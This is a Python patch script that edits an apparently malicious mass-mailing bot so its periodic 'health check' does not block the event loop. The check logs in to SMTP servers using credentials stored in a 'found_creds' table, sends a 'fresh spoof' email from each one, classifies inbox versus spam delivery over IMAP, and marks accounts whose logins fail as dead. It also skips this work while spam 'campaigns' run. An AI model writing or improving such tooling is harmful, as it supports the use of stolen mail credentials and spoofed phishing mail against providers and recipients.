#!/usr/bin/env python3
"""
Patch 2: Fix health check blocking the event loop.
- Health check skips entirely when a campaign is running
- AUTH tests + send_clean wrapped in asyncio.to_thread (non-blocking)
- IMAP check already uses asyncio.to_thread (OK)
"""

SB_PATH = "/opt/darkvasend/auditguard/sender_bot.py"

with open(SB_PATH, "r") as f:
    sb = f.read()

# ==========================================================
# FIX 1: Make health check skip when campaign is active
# ==========================================================

old_health_start = '''async def _smtp_health_check_loop():
    """Every 3h: send FRESH spoof from each SMTP, check IMAP inbox/spam, update labels, kill deads."""
    import sqlite3 as _sql, uuid as _uuid, imaplib, ssl as _ssl
    while True:
        await asyncio.sleep(10800)  # 3 hours
        try:
            print("[IMAP CHECK] Starting fresh delivery classification...", flush=True)'''

new_health_start = '''async def _smtp_health_check_loop():
    """Every 3h: send FRESH spoof from each SMTP, check IMAP inbox/spam, update labels, kill deads."""
    import sqlite3 as _sql, uuid as _uuid, imaplib, ssl as _ssl
    while True:
        await asyncio.sleep(10800)  # 3 hours
        try:
            # SKIP health check if any campaign is running
            from .campaign_sender import _running_campaigns
            if _running_campaigns:
                active = [k for k, v in _running_campaigns.items() if v]
                if active:
                    print(f"[IMAP CHECK] SKIPPED — campaigns running: {active}", flush=True)
                    continue
            print("[IMAP CHECK] Starting fresh delivery classification...", flush=True)'''

sb = sb.replace(old_health_start, new_health_start)

# ==========================================================
# FIX 2: Wrap AUTH test + send_clean in asyncio.to_thread
# to avoid blocking the event loop
# ==========================================================

# Find the phase 1 loop and wrap the blocking calls
old_phase1_loop = '''            # Phase 1: AUTH check + send fresh spoof
            for r in rows:
                sid = r["id"]
                host, port = r["smtp_host"], r["smtp_port"]
                user, pwd = r["smtp_user"], r["smtp_password"]
                smtp_config = {
                    "host": host, "port": port,
                    "username": user, "password": pwd,
                    "from_email": user,
                }

                # AUTH test
                try:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    if port == 465:
                        srv = smtplib.SMTP_SSL(host, port, timeout=8, context=ctx)
                    else:
                        srv = smtplib.SMTP(host, port, timeout=8)
                        srv.ehlo()
                        try:
                            srv.starttls(context=_ssl.create_default_context())
                            srv.ehlo()
                        except Exception:
                            pass
                    srv.login(user, pwd)
                    srv.quit()
                except smtplib.SMTPAuthenticationError:
                    db.execute("UPDATE found_creds SET auth_ok=0 WHERE id=?", (sid,))
                    dead_ids.append(sid)
                    print(f"[IMAP CHECK] #{sid} {host} AUTH DEAD", flush=True)
                    continue
                except Exception:
                    continue

                # Send fresh spoof
                marker = f"{run_id}-{sid}"
                subject = f"{tpl['subject']} [{marker}]"
                result = send_clean(
                    smtp_config, tpl["from_name"], tpl["from_email"],
                    checker_email, subject, tpl["html"],
                    tpl.get("reply_to", ""), None,
                )
                if result["success"]:
                    markers[sid] = {"host": host, "marker": marker, "old_ctx": r["context"] or ""}
                await asyncio.sleep(0.3)'''

new_phase1_loop = '''            # Phase 1: AUTH check + send fresh spoof (NON-BLOCKING)
            def _auth_and_send_one(sid, host, port, user, pwd, smtp_config, run_id, tpl, checker_email, context):
                """Blocking AUTH test + send — runs in thread."""
                result = {"sid": sid, "host": host, "dead": False, "skip": False, "marker": None, "old_ctx": context or ""}
                # AUTH test
                try:
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    if port == 465:
                        srv = smtplib.SMTP_SSL(host, port, timeout=8, context=ctx)
                    else:
                        srv = smtplib.SMTP(host, port, timeout=8)
                        srv.ehlo()
                        try:
                            srv.starttls(context=_ssl.create_default_context())
                            srv.ehlo()
                        except Exception:
                            pass
                    srv.login(user, pwd)
                    srv.quit()
                except smtplib.SMTPAuthenticationError:
                    result["dead"] = True
                    return result
                except Exception:
                    result["skip"] = True
                    return result

                # Send fresh spoof
                marker = f"{run_id}-{sid}"
                subject = f"{tpl['subject']} [{marker}]"
                r = send_clean(
                    smtp_config, tpl["from_name"], tpl["from_email"],
                    checker_email, subject, tpl["html"],
                    tpl.get("reply_to", ""), None,
                )
                if r["success"]:
                    result["marker"] = marker
                return result

            for r in rows:
                # Check again if campaign started while we're running
                from .campaign_sender import _running_campaigns as _rc2
                if any(_rc2.values()):
                    print("[IMAP CHECK] Campaign started — aborting health check", flush=True)
                    break

                sid = r["id"]
                host, port = r["smtp_host"], r["smtp_port"]
                user, pwd = r["smtp_user"], r["smtp_password"]
                smtp_config = {
                    "host": host, "port": port,
                    "username": user, "password": pwd,
                    "from_email": user,
                }

                # Run AUTH + send in thread to avoid blocking event loop
                hc_result = await asyncio.to_thread(
                    _auth_and_send_one, sid, host, port, user, pwd,
                    smtp_config, run_id, tpl, checker_email, r["context"]
                )

                if hc_result["dead"]:
                    db.execute("UPDATE found_creds SET auth_ok=0 WHERE id=?", (sid,))
                    dead_ids.append(sid)
                    print(f"[IMAP CHECK] #{sid} {host} AUTH DEAD", flush=True)
                    continue
                if hc_result["skip"]:
                    continue
                if hc_result["marker"]:
                    markers[sid] = {"host": host, "marker": hc_result["marker"], "old_ctx": hc_result["old_ctx"]}
                await asyncio.sleep(0.3)'''

sb = sb.replace(old_phase1_loop, new_phase1_loop)

# ==========================================================
# FIX 3: Also wrap the IMAP DB update phase to use quick commits
# and add busy_timeout=300000 everywhere
# ==========================================================
sb = sb.replace(
    'db.execute("PRAGMA busy_timeout=120000")',
    'db.execute("PRAGMA busy_timeout=300000")'
)

with open(SB_PATH, "w") as f:
    f.write(sb)

print("sender_bot.py PATCHED (health check fix)")
